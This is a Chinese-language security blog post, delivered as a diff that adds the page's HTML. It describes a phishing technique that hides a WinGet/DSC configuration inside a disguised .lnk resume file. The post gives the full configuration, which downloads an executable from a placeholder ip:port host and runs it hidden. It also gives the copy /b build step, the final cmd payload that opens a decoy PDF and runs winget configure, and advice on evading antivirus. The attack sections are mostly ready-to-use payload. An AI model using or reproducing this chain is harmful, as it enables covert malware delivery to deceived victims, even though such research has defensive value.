@@ -1,0 +1,216 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>新型社工钓鱼伪装技术之WinGet配置文件+Lnk文件 | 卡卡罗特取西经</title><meta name="author" content="ybdt"><meta name="copyright" content="ybdt"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="01 前言Winget钓鱼是一种容易被防御者忽视的钓鱼方式，以至于公开的文件滥用后缀中并没有它：https:&#x2F;&#x2F;filesec.io&#x2F; 本文会详细介绍这种新的钓鱼伪装技术，包括漏洞复现、涉及的概念，如何一步步构造及原理 02 漏洞复现压缩包内有Lnk文件jianli.lnk 双击jianli.lnk后可以看到成功弹出了伪装的pdf文档，并下载执行了putty.exe 03 前置知识3.1 Powe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="新型社工钓鱼伪装技术之WinGet配置文件+Lnk文件">
+<meta property="og:url" content="http://example.com/2026/04/21/%E6%96%B0%E5%9E%8B%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC%E4%BC%AA%E8%A3%85%E6%8A%80%E6%9C%AF%E4%B9%8BWinGet%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-Lnk%E6%96%87%E4%BB%B6/index.html">
+<meta property="og:site_name" content="卡卡罗特取西经">
+<meta property="og:description" content="01 前言Winget钓鱼是一种容易被防御者忽视的钓鱼方式，以至于公开的文件滥用后缀中并没有它：https:&#x2F;&#x2F;filesec.io&#x2F; 本文会详细介绍这种新的钓鱼伪装技术，包括漏洞复现、涉及的概念，如何一步步构造及原理 02 漏洞复现压缩包内有Lnk文件jianli.lnk 双击jianli.lnk后可以看到成功弹出了伪装的pdf文档，并下载执行了putty.exe 03 前置知识3.1 Powe">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2026-04-21T09:48:37.000Z">
+<meta property="article:modified_time" content="2026-04-21T09:49:52.956Z">
+<meta property="article:author" content="ybdt">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/04/21/%E6%96%B0%E5%9E%8B%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC%E4%BC%AA%E8%A3%85%E6%8A%80%E6%9C%AF%E4%B9%8BWinGet%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-Lnk%E6%96%87%E4%BB%B6/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '新型社工钓鱼伪装技术之WinGet配置文件+Lnk文件',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-04-21 17:49:52'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="卡卡罗特取西经" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="卡卡罗特取西经"><span class="site-name">卡卡罗特取西经</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">新型社工钓鱼伪装技术之WinGet配置文件+Lnk文件</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-04-21T09:48:37.000Z" title="Created 2026-04-21 17:48:37">2026-04-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-04-21T09:49:52.956Z" title="Updated 2026-04-21 17:49:52">2026-04-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6/">攻防研究</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="新型社工钓鱼伪装技术之WinGet配置文件+Lnk文件"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="01-前言"><a href="#01-前言" class="headerlink" title="01 前言"></a>01 前言</h1><p>Winget钓鱼是一种容易被防御者忽视的钓鱼方式，以至于公开的文件滥用后缀中并没有它：<a target="_blank" rel="noopener" href="https://filesec.io/">https://filesec.io/</a></p>
+<p>本文会详细介绍这种新的钓鱼伪装技术，包括漏洞复现、涉及的概念，如何一步步构造及原理</p>
+<h1 id="02-漏洞复现"><a href="#02-漏洞复现" class="headerlink" title="02 漏洞复现"></a>02 漏洞复现</h1><p>压缩包内有Lnk文件jianli.lnk<br><img src="/2026/04/21/%E6%96%B0%E5%9E%8B%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC%E4%BC%AA%E8%A3%85%E6%8A%80%E6%9C%AF%E4%B9%8BWinGet%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-Lnk%E6%96%87%E4%BB%B6/03.png" alt="image"></p>
+<p>双击jianli.lnk后可以看到成功弹出了伪装的pdf文档，并下载执行了putty.exe<br><img src="/2026/04/21/%E6%96%B0%E5%9E%8B%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC%E4%BC%AA%E8%A3%85%E6%8A%80%E6%9C%AF%E4%B9%8BWinGet%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-Lnk%E6%96%87%E4%BB%B6/04.png" alt="image"></p>
+<h1 id="03-前置知识"><a href="#03-前置知识" class="headerlink" title="03 前置知识"></a>03 前置知识</h1><h2 id="3-1-Powershell-Microsoft-Desired-State-Configuration"><a href="#3-1-Powershell-Microsoft-Desired-State-Configuration" class="headerlink" title="3.1 Powershell/Microsoft Desired State Configuration"></a>3.1 Powershell/Microsoft Desired State Configuration</h2><p>首先Powershell DSC(Desired State Configuration) 和 Microsoft DSC(Desired State Configuration)是同一个东西，只不过Microsoft DSC为了跨平台，基于跨平台的Powershell 7构建，可以理解为Powershell DSC的升级版</p>
+<p>PowerShell DSC (Desired State Configuration) 是 Windows PowerShell 中的一项配置管理框架，用于以声明式方式定义和自动维持系统的“期望状态”（Desired State）。</p>
+<p>你可以把它理解为：“直接告诉系统应该是什么样子，而不是一步步教它怎么做。”</p>
+<ol>
+<li><p>声明式配置（Declarative）<br>DSC 使用类似配置文件的方式描述目标状态，例如：<br>某个服务必须运行<br>某个文件必须存在<br>某个注册表键必须设置为某值<br>而不是写脚本一步步执行。</p>
+</li>
+<li><p>三大组件<br> （1）Configuration（配置）<br> 用 PowerShell 写的 DSL，描述目标状态，含义：确保 IIS 已安装</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Configuration MyConfig &#123;</span><br><span class="line">    Node &quot;localhost&quot; &#123;</span><br><span class="line">        WindowsFeature IIS &#123;</span><br><span class="line">            Name = &quot;Web-Server&quot;</span><br><span class="line">            Ensure = &quot;Present&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p> （2）Resource（资源）<br> DSC 的最小执行单元，每个资源负责管理一种状态。<br> 常见资源类型：File（文件）、Service（服务）、Registry（注册表）、WindowsFeature（系统组件）<br> 资源本质是一个 PowerShell 模块，实现三个方法：Get（当前状态）、Test（是否符合期望状态）、Set（修复到期望状态）<br> （3）LCM（Local Configuration Manager）<br> DSC 的核心引擎，运行在每台目标机器上<br> 负责：应用配置、定期检查状态、自动修复</p>
+</li>
+<li><p>工作流程<br>DSC 的执行流程如下：<br>编写 Configuration -&gt; 编译为 MOF 文件（Managed Object Format） -&gt; LCM 读取 MOF -&gt; 执行 Resource -&gt; 持续监控并保持状态一致</p>
+</li>
+<li><p>运行模式</p>
+</li>
+<li><p>Push 模式<br>管理端主动推送配置到目标机器，适合小规模或临时配置</p>
+</li>
+<li><p>Pull 模式<br>节点主动从服务器拉取配置，类似于：Puppet、Chef、Ansible，更适合大规模环境</p>
+</li>
+</ol>
+<h1 id="04-漏洞分析"><a href="#04-漏洞分析" class="headerlink" title="04 漏洞分析"></a>04 漏洞分析</h1><p>测试环境：Windows 10 22H2 19045.6466</p>
+<h2 id="4-1-受害者点击情况分析"><a href="#4-1-受害者点击情况分析" class="headerlink" title="4.1 受害者点击情况分析"></a>4.1 受害者点击情况分析</h2><h4 id="受害者在压缩软件中直接双击文件"><a href="#受害者在压缩软件中直接双击文件" class="headerlink" title="受害者在压缩软件中直接双击文件"></a>受害者在压缩软件中直接双击文件</h4><ol>
+<li>7zip<br>在7zip中直接双击快捷方式，快捷方式实际被解压到 %TMP%\7zO4562D2C3 下<br><img src="/2026/04/21/%E6%96%B0%E5%9E%8B%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC%E4%BC%AA%E8%A3%85%E6%8A%80%E6%9C%AF%E4%B9%8BWinGet%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-Lnk%E6%96%87%E4%BB%B6/01.png" alt="image"></li>
+</ol>
+<p>在Winrar中直接双击快捷方式，快捷方式实际被解压到 %TMP%\Rar$DIa6744.14020.rartemp 下<br><img src="/2026/04/21/%E6%96%B0%E5%9E%8B%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC%E4%BC%AA%E8%A3%85%E6%8A%80%E6%9C%AF%E4%B9%8BWinGet%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-Lnk%E6%96%87%E4%BB%B6/02.png" alt="image"></p>
+<p>测试发现，关闭7zip和Winrar的窗口后，Rar$DIa6744.14020.rartemp  和 7zO4562D2C3 均会自动删除，我们想寻找以7z或Rar开头的目录，可以遍历%TMP%目录，来定位在压缩软件中打开的文件位置</p>
+<h4 id="受害者解压缩后，在文件夹中双击文件"><a href="#受害者解压缩后，在文件夹中双击文件" class="headerlink" title="受害者解压缩后，在文件夹中双击文件"></a>受害者解压缩后，在文件夹中双击文件</h4><p>一般用户接收文件要么在下载（Downloads）目录，要么在桌面（Desktop）目录，所以受害者如果对压缩文件进行解压缩的话，解压后的文件夹通常在 Downloads 目录或者 Desktop 目录</p>
+<h2 id="4-2-构造winget配置文件"><a href="#4-2-构造winget配置文件" class="headerlink" title="4.2 构造winget配置文件"></a>4.2 构造winget配置文件</h2><p>配置文件中干的事就是下载并执行putty.exe，将配置文件中的<a href="http://ip:port/putty.exe换成自己的地址，保存文件为conf.yml">http://ip:port/putty.exe换成自己的地址，保存文件为conf.yml</a></p>
+<p>简单讲解一下这个配置文件：比如DownloadFile这部分来说，DSC系统会检查TestScript，如果发现文件不存在，会返回false，返回false则执行SetScript，下载文件到指定位置，GetScript用来返回状态，ExecuteFile也同理，TestScript处直接赋值$false，表示总是执行SetScript，GetScript用来返回状态</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">properties:</span><br><span class="line">  configurationVersion: 0.2</span><br><span class="line">  resources:</span><br><span class="line">    - resource: PSDscResources/Script</span><br><span class="line">      id: DownloadFile</span><br><span class="line">      directives:</span><br><span class="line">        description: Download file</span><br><span class="line">      settings:</span><br><span class="line">        GetScript: |</span><br><span class="line">          return @&#123; Result = (Test-Path &quot;$env:LOCALAPPDATA\putty.exe&quot;) &#125;</span><br><span class="line">        TestScript: |</span><br><span class="line">          Test-Path &quot;$env:LOCALAPPDATA\putty.exe&quot;</span><br><span class="line">        SetScript: |</span><br><span class="line">          Invoke-WebRequest -Uri &quot;http://ip:port/putty.exe&quot; -OutFile &quot;$env:LOCALAPPDATA\putty.exe&quot;</span><br><span class="line"></span><br><span class="line">    - resource: PSDscResources/Script</span><br><span class="line">      id: ExecuteFile</span><br><span class="line">      dependsOn:</span><br><span class="line">        - DownloadFile</span><br><span class="line">      directives:</span><br><span class="line">        description: Execute file</span><br><span class="line">      settings:</span><br><span class="line">        GetScript: |</span><br><span class="line">          return @&#123; Result = $false &#125;</span><br><span class="line">        TestScript: |</span><br><span class="line">          return $false</span><br><span class="line">        SetScript: |</span><br><span class="line">          Start-Process -FilePath &quot;$env:LOCALAPPDATA\putty.exe&quot; -WindowStyle Hidden</span><br></pre></td></tr></table></figure>
+
+<p>将配置文件改成一行形式如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;properties: &#123;configurationVersion: 0.2, resources: [&#123;resource: &quot;PSDscResources/Script&quot;, id: &quot;DownloadFile&quot;, directives: &#123;description: &quot;Download file&quot;&#125;, settings: &#123;GetScript: &quot;return @&#123; Result = (Test-Path \&quot;$env:LOCALAPPDATA\\putty.exe\&quot;) &#125;&quot;, TestScript: &quot;Test-Path \&quot;$env:LOCALAPPDATA\\putty.exe\&quot;&quot;, SetScript: &quot;Invoke-WebRequest -Uri \&quot;http://ip:port/putty.exe\&quot; -OutFile \&quot;$env:LOCALAPPDATA\\putty.exe\&quot;&quot;&#125;&#125;, &#123;resource: &quot;PSDscResources/Script&quot;, id: &quot;ExecuteFile&quot;, dependsOn: [&quot;DownloadFile&quot;], directives: &#123;description: &quot;Execute file&quot;&#125;, settings: &#123;GetScript: &quot;return @&#123; Result = $false &#125;&quot;, TestScript: &quot;return $false&quot;, SetScript: &quot;Start-Process -FilePath \&quot;$env:LOCALAPPDATA\\putty.exe\&quot; -WindowStyle Hidden&quot;&#125;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以执行下列命令测试配置文件是否生效，成功弹出putty.exe则生效</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo y | winget configure -f conf.yml</span><br></pre></td></tr></table></figure>
+
+<p>winget文件双击后，执行效果如下<br><img src="/2026/04/21/%E6%96%B0%E5%9E%8B%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC%E4%BC%AA%E8%A3%85%E6%8A%80%E6%9C%AF%E4%B9%8BWinGet%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-Lnk%E6%96%87%E4%BB%B6/05.png" alt="image"></p>
+<h2 id="4-3-把winget配置文件附加到link文件的二进制内容中"><a href="#4-3-把winget配置文件附加到link文件的二进制内容中" class="headerlink" title="4.3 把winget配置文件附加到link文件的二进制内容中"></a>4.3 把winget配置文件附加到link文件的二进制内容中</h2><p>使用如下命令将conf.yml附加到original.lnk文件后面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /b cmd.lnk + padding.txt + conf.yml jianli.lnk</span><br></pre></td></tr></table></figure>
+<p>可以执行如下命令验证，从1298行开始读的内容是否是配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more +1298 update.lnk &gt; a.txt</span><br></pre></td></tr></table></figure>
+<p>这里有2个坑，不知道可能会让你很难受</p>
+<p>在 Windows 的命令行环境（CMD）中，more 命令是一个基于 文本流（Text Stream） 设计的古老工具。当它被迫处理 .lnk 这种二进制文件时，它会按照一套非常陈旧的逻辑来“强行”解释字节。</p>
+<p>每当它扫到0x0A (LF，就是\n) 或者 0x0D 0x0A (CR+LF，就是\r\n)时，都会算作一个换行，但是二进制流中分布着大量随机的0x0A、0x0D 0x0A，导致精确计算偏移量会不稳定，所以通过一个技巧，现在lnk文件末尾添加1000个换行，再附加配置文件，配置文件内容前面即使有空行也不影响执行</p>
+<p>再一个是截断符，在 more（以及很多早期的 DOS 工具）眼中，文件的真正终结者不是文件的大小（Size），而是0x1A (ASCII 26, Ctrl+Z / SUB)，当 more 读取文件流时，一旦遇到字节 0x1A，它会立即认为：“好的，文件到此结束了。”</p>
+<h2 id="4-4-构造一个用来迷惑受害者的pdf，托管在远程服务器"><a href="#4-4-构造一个用来迷惑受害者的pdf，托管在远程服务器" class="headerlink" title="4.4 构造一个用来迷惑受害者的pdf，托管在远程服务器"></a>4.4 构造一个用来迷惑受害者的pdf，托管在远程服务器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start http://ip:port/b.pdf</span><br></pre></td></tr></table></figure>
+<h2 id="4-5-最终Payload"><a href="#4-5-最终Payload" class="headerlink" title="4.5 最终Payload"></a>4.5 最终Payload</h2><p>切换到lnk文件被提取的目录，使用more提取winget配置文件，启动伪造的pdf，使用提取的配置文件调用winget，还要注意lnk文件的259字符限制，最终payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\cmd.exe /c &quot;(cd %tmp%\7z* || cd %tmp%\Rar* || cd %userprofile%\Desktop) &amp; (more +1000 *.lnk &gt; %tmp%\conf.yml) &amp; (start http://ip:port/b.pdf) &amp; (echo y | winget configure -f %tmp%\conf.yml &gt; nul)&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="05-进一步探索"><a href="#05-进一步探索" class="headerlink" title="05 进一步探索"></a>05 进一步探索</h1><h2 id="5-1-在线配置"><a href="#5-1-在线配置" class="headerlink" title="5.1 在线配置"></a>5.1 在线配置</h2><p>有人提到，winget可以使用托管在远端的配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winget configure --enable</span><br><span class="line">winget configure http://ip:port/a.yml --accept-configuration-agreements</span><br></pre></td></tr></table></figure>
+<p>经过测试，并不行，至少在我的winget版本v1.28.220中不行，未来版本据说可能加这个功能<br><img src="/2026/04/21/%E6%96%B0%E5%9E%8B%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC%E4%BC%AA%E8%A3%85%E6%8A%80%E6%9C%AF%E4%B9%8BWinGet%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-Lnk%E6%96%87%E4%BB%B6/06.png" alt="image"></p>
+<h2 id="5-2-其他钓鱼方式"><a href="#5-2-其他钓鱼方式" class="headerlink" title="5.2 其他钓鱼方式"></a>5.2 其他钓鱼方式</h2><p>对于lnk落地就被查杀的360，可以换换思路，使用经典的exe钓鱼，用C++实现调用下列命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winget configure conf.yml --accept-configuration-agreements --disable-interactivity</span><br></pre></td></tr></table></figure>
+<p>然后给exe改个图标，双重后缀视情况而定，由于执行链是exe调用winget，不存在明显的可疑特征，能绕过多数杀软的检测</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://blog.compass-security.com/2026/03/winget-desired-state-initial-access-established/">https://blog.compass-security.com/2026/03/winget-desired-state-initial-access-established/</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">ybdt</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2026/04/21/%E6%96%B0%E5%9E%8B%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC%E4%BC%AA%E8%A3%85%E6%8A%80%E6%9C%AF%E4%B9%8BWinGet%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-Lnk%E6%96%87%E4%BB%B6/">http://example.com/2026/04/21/%E6%96%B0%E5%9E%8B%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC%E4%BC%AA%E8%A3%85%E6%8A%80%E6%9C%AF%E4%B9%8BWinGet%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-Lnk%E6%96%87%E4%BB%B6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2026/04/06/CVE-2026-24291-Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E2%80%9CRegPwn%E2%80%9D%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" title="CVE-2026-24291-Windows权限提升漏洞“RegPwn”复现分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">CVE-2026-24291-Windows权限提升漏洞“RegPwn”复现分析</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ybdt</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ybdt"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">要想练就绝世武功，就要忍受常人难忍受的痛</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#02-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">02 漏洞复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#03-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">03 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-Powershell-Microsoft-Desired-State-Configuration"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 Powershell&#x2F;Microsoft Desired State Configuration</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" 